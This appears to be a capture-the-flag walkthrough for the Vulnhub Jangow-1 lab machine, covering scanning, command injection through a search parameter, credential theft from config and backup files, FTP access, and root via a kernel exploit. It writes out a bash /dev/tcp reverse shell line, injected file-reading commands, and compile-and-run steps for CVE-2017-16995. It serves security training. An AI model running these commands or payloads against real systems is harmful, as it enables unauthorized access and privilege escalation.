# Jangow-1 CTF by Vulnhub walkthrough

# Tools used

1. Netdiscover
2. Nmap
3. Urlencoder
4. Linpeas
   
# First key

## Step 1 : Enumeration

First, we could use netdiscover or Nmap to find the IP address of the target machine.

Netdiscover could be used using `sudo netdiscover` while nmap could be used using `nmap -sS -T4 10.38.1.110-120`
NOTE : Using nmap as illustrated will only work if the setup process was the same as mine (https://github.com/kxnja/Jangow-01-CTF-by-Vulnhub/blob/main/setup.md)

Netdiscover yields the following;

<img width="955" height="277" alt="image" src="https://github.com/user-attachments/assets/b476db0b-30d4-4128-a165-a21c03640576" />

Nmap on the other hand gives us the following;

<img width="955" height="325" alt="image" src="https://github.com/user-attachments/assets/2c6b6efe-c842-4691-9972-04fb0a3a4d0f" />

Nmap not only gives the IP address of the target machine but also the open ports.

We find 2 open ports; port 21 and port 80.

Using your browser head on to `http://10.38.1.115` this takes us to a grayscale site.

## Step 2 : Foothold

### Part a
On the top right corner of the website we find a `buscar` button.

<img width="1920" height="858" alt="image" src="https://github.com/user-attachments/assets/ee4f8b95-d85a-49d0-8ba1-27a39596b831" />

The website seems to be doing some kind of post request and might be vulnerable to Local file inclusion.
`Local file inclusion` is a vulnerability that lets a user load file from a server without proper validation.

When we do some research on buscar we find that it is a spanish word for search. We can the try to search for files on the search bar using the `ls` command.
`http://10.38.1.115/site/busque.php?buscar=ls -al` this give a wordpress file and when we `ls` the wordpress file `http://10.38.1.115/site/busque.php?buscar=ls -al wordpress`.

<img width="1920" height="357" alt="image" src="https://github.com/user-attachments/assets/e719e43e-2f97-4b86-9bc7-8e596d7a92a9" />

Under the wordpress file we find a config.php file that we can open using the `cat` command. `http://10.38.1.115/site/busque.php?buscar=ls -al wordpress/config.php`.

<img width="803" height="234" alt="image" src="https://github.com/user-attachments/assets/8dc089e6-8b5c-4bed-8614-0464056128ae" />

<img width="931" height="437" alt="image" src="https://github.com/user-attachments/assets/d3e5f255-7ee4-422b-953f-6f14ae0ceb05" />

We find a username and a password in the config.php file.

Copy and paste the code to a text editor. 
Open the terminal try create an ftp connection with the target machine using the credentials provided.

<img width="472" height="182" alt="image" src="https://github.com/user-attachments/assets/60a57e84-2ced-4415-b073-06ef10262886" />

The connection fails due to invalid credentials so we need to continue looking for the legitimate credentials.

Go back to your browser and using the `pwd` command we can print the working directory, which we find to be `/var/www/hrmal/site`.

<img width="955" height="232" alt="image" src="https://github.com/user-attachments/assets/7b451e6c-dbcc-4f38-bcc6-2cecfd6a906e" />

Using `ls -al /var/www/html` we can list all the directories and file in the directory.

<img width="948" height="206" alt="image" src="https://github.com/user-attachments/assets/7a966a31-a084-4484-ba6f-5b051b35bb6e" />

Here, we find a backip file that we can then open using `cat`.

<img width="958" height="362" alt="image" src="https://github.com/user-attachments/assets/2eb4a66f-c546-44dd-a96f-11f05af83b15" />

We find another username and password that we can then use to complete the ftp connection.

<img width="441" height="196" alt="image" src="https://github.com/user-attachments/assets/8efa9cf1-5bb6-4bea-96ea-7363b4394ad7" />

Upon trying the new set of credentials we successfully create a ftp connection.

<img width="514" height="173" alt="image" src="https://github.com/user-attachments/assets/011f7c69-eac1-45d2-81b4-462c9dcbe5d7" />

Change the directory to `/home` and using `ls` we find a `jangow01` directory and switching to it we find a `user.txt` file that we can download to our machine using the `get` command.

<img width="955" height="390" alt="image" src="https://github.com/user-attachments/assets/87962d16-ab65-4615-848c-7384a189fb5c" />

Using `ls` we can see the file on our machine and we can open it using `cat`.

<img width="480" height="65" alt="image" src="https://github.com/user-attachments/assets/968b9981-3e83-48d6-88c0-0b68d65843ca" />

### Part b

First we need to set up a remote connection to the target machine and there are several methods to do this.

### Method 1 (Using a reverse shell php code)

First we need to set up a reverse shell. There are several methods of doing this but since we are aware of the LFI (Local file inclusion) vulnerability we can add a php file that will enable remote connection.

We can either write the php code on our on or get it on the internet.

I got mine from the internet https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php .
Copy the code and using nano on the terminal save the file in a php file after changing the ip address to your host machine and the listening port to 4444.

To save the file using nano we can use the command `sudo nano name.php`

Paste the code and change the IP to the host machine's IP (if unsure you can use `ifconfig`) also change the listening port to 4444. It is also labelled to change the as seen.

<img width="580" height="179" alt="image" src="https://github.com/user-attachments/assets/4f339196-f6e1-4f3d-a601-4f391d5be9f6" />

After saving and exiting nano we can create an ftp connection to the jangow machine using `ftp 10.1.138.115`.

When we try to copy the php file to the web server, we find that it is impossible since the user jangow does not have the required permissions.

<img width="523" height="345" alt="image" src="https://github.com/user-attachments/assets/0ed664ad-bbf9-4d8e-b979-598ffc584cca" />

### Method 2 (Netcat)

We could also try to use netcat to establish a remote connection to the target machine.

Using the `nc` command and specifying the target's IP and port we can try to establish the remote connection.

NOTE : You need to type in the `USER` and `PASS` to differentiate the two.

<img width="296" height="216" alt="image" src="https://github.com/user-attachments/assets/5c2bb833-11ce-44d1-818c-885fa4919482" />

This also does not work since we cannot use any commands as seen above.

### Method 3 (Using a bash shell script)

We can get a script from the internet just as we did with the php code.

<img width="946" height="772" alt="image" src="https://github.com/user-attachments/assets/ac959b58-46ea-44d7-ae81-d1ceba68c990" />

`bash -i >& /dev/tcp/10.38.1.110/443 0>&1` 

I have modified both the listening port and the listening IP.

So now we need to paste the bash script to the target's CLI which was on the search bar of the search engine as follows;

<img width="683" height="49" alt="image" src="https://github.com/user-attachments/assets/5385c89c-6e5a-4017-a7f0-a07a685f4635" />

The machine treats the command as a string and therefore cannot execute.
We can solve this issue by using an encoder and we can use the one from https://www.urlencoder.org

<img width="864" height="751" alt="image" src="https://github.com/user-attachments/assets/408595ee-3f68-4987-9559-6a87dfdfb150" />

Paste the encoded url on the the target's CLI and on running it our listener picks up a signal and establishes a remote connection.

<img width="697" height="212" alt="image" src="https://github.com/user-attachments/assets/5a371e9d-fb1a-4ece-aeee-b17a5aec22e7" />

We use `python3` to make the connection interactive and the command `export TERM=vterm` is to set the environment variable.

## Step 3 Priviledge Escalation

We will use a tool called linpeas for this.

Go to https://github.com/peass-ng/PEASS-ng/releases and download the `linpeas.sh` file.

Once downloaded move the file to the use folder from the downloads.

Create a split view of the terminal and using `ftp 10.38.1.116` upload the linpeas file to the target machine.

<img width="457" height="348" alt="image" src="https://github.com/user-attachments/assets/c82e58c5-b6cf-4785-a05e-b7dc74881d99" />

Using `ls -al` we can confirm that the file has been transferred.

<img width="768" height="225" alt="image" src="https://github.com/user-attachments/assets/6aec539f-7e35-4d6b-9476-19745ab8bded" />

The file, at this point, only has reed and write permissions and no execute permissions.

We can use the command `chmod +x linpeas.sh` to make it executable.

Now execute it using `./linpeas.sh`.

Linpeas is a tool used to search for paths that can be used to escalate priviledges in linux.

<img width="931" height="798" alt="image" src="https://github.com/user-attachments/assets/04086528-5fe7-4cae-b2ca-132d8bf97a4d" />

We have found a couple of exploits that the machine is vulnerable to and we can start with the first one.

Go to https://www.exploit-dm.com/exploits/45010 to download the exploit.

<img width="935" height="754" alt="image" src="https://github.com/user-attachments/assets/aada273a-f226-4cdc-8309-844cddd092ed" />

Move the file from the downloads folder to the user one and using `ftp` upload the file to the target machine.

<img width="934" height="341" alt="image" src="https://github.com/user-attachments/assets/3d7d07d7-5224-4266-9ccd-66f4090af8f2" />

Now compile the file usong the command `gcc 45010.c -o cve-2017-16995` this creates an executable file called cve-2017-16995.

<img width="482" height="85" alt="image" src="https://github.com/user-attachments/assets/def1638d-470d-4dee-aef0-963d2beeaa57" />

Execute the file using `./cve-2017-16995` and this gives us root priviledges that we can the use to find the root flag.

Change the working directory to root `cd /root` and using `ls` we find a proof.txt file that is the root flag.

<img width="829" height="455" alt="image" src="https://github.com/user-attachments/assets/b6a920ba-6d03-4b6f-aa17-3b25f09bda41" />

We can use `cat` to open the root flag.

<img width="843" height="610" alt="image" src="https://github.com/user-attachments/assets/46b6b2fd-5c97-4279-9e16-e8b676ae4071" />

# Congratulations on finishing the Jangow CTF
## Cheers and happy hacking, ethically of course
